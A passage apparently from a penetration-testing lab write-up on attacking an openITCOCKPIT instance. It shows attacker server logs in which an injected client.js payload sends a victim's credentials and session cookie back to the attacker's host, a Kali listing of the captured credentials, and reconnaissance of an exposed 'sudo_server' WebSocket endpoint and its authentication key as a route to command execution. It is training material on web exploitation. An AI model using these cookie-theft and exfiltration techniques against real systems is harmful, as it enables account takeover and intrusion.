WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on https://192.168.45.203:80
Press CTRL+C to quit
[+] Sending Payload
192.168.45.203 - - [01/Aug/2025 18:35:16] "GET /client.js HTTP/1.1" 200 -
[+] Received Credential: admin admin
192.168.45.203 - - [01/Aug/2025 18:35:22] "POST /credential HTTP/1.1" 200 -
[+] Received cookie: document.cookie CT[CTUser]=Q2FrZQ%3D%3D.bCAYcOnyK55zpjwEiRrFB7y1o2vhtYDUHDDCUrrAZZ4fbwHEBuT4mP7YB8Xiry2ObYn46dj3SDXS0bHGS73WiwsLVtVb2MG3HzxBO1zSDwKx5GR%2FlLjsx23vQih53g%3D%3D
192.168.45.203 - - [01/Aug/2025 18:35:22] "POST /cookie HTTP/1.1" 200 -

```
You can verify the creds have been saved in the database by running:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 db.py get --credentials --all
[(1, 'test', 'test123'), (2, 'admin', 'admin'), (3, 'admin', 'admin'), (4, 'admin', 'admin'), (5, 'admin', 'admin')]
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ 
```
## RCE Hunting
Now that we have access to the content of an authenticated user, we can start hunting for something that will lead us closer to running system commands. First, we'll inspect the pages we currently have access to.
### Discovery
The discovery process is not automated and can be time-consuming. However, we can look for keywords that trigger our hacker-senses in order to speed up this process. For example, the [/commands](https://openitcockpit/commands), [/cronjobs](https://openitcockpit/cronjobs), and [/serviceescalations](https://openitcockpit/serviceescalations) files we obtained from the victim immediately catch our attention as the names of the files suggest that they may permit system access.

Interestingly, `/openitcockpit/commands.html` contains an object named `appData`, which contains some interesting variables:
```javascript
var appData = {"jsonData":{"isAjax":false,"isMobile":false,"websocket_url":"wss:\/\/openitcockpit\/sudo_server","akey":"1fea123e07f730f76e661bced33a94152378611e"},"webroot":"https:\/\/openitcockpit\/","url":"","controller":"Commands","action":"index","params":{"named":[],"pass":[],"plugin":"","controller":"commands","action":"index"},"Types":{"CODE_SUCCESS":"success","CODE_ERROR":"error","CODE_EXCEPTION":"exception","CODE_MISSING_PARAMETERS":"missing_parameters","CODE_NOT_AUTHENTICATED":"not_authenticated","CODE_AUTHENTICATION_FAILED":"authentication_failed","CODE_VALIDATION_FAILED":"validation_failed","CODE_NOT_ALLOWED":"not_allowed","CODE_NOT_AVAILABLE":"not_available","CODE_INVALID_TRIGGER_ACTION_ID":"invalid_trigger_action_id","ROLE_ADMIN":"admin","ROLE_EMPLOYEE":"employee"}};
```
There are two portions of interest. First a `"websocket_url"` is defined, which ends with `"sudo_server"`. Next, a `key` named `"akey"` is defined with a value of `"1fea123e07f730f76e661bced33a94152378611e"`. The combination of a commands route and `sudo_server` WebSocket connection endpoint piques our interest.

WebSocket1 is a browser-supported communication protocol that uses HTTP for the initial connection but then creates a full-duplex connection, allowing for fast communication between the client and server. While HTTP is a stateless protocol, WebSocket is stateful. In a properly-built solution, the initial HTTP connection would authenticate the user and each subsequent WebSocket request would not require authentication. However, due to complexities many developers face when programming with the WebSocket protocol, they often "roll their own" authentication. In openITCOCKPIT, we see a key is provided in the same object a `websocket_url` is set. We suspect this might be used for authentication.

WebSocket communication is often ignored in pentests, despite its potential to control a server like HTTP. Tools like BurpSuite historically lacked support (*Repeater* only recently added it; *Intruder* still doesn't). Discovering a WebSocket endpoint and key can greatly raise an application's risk.

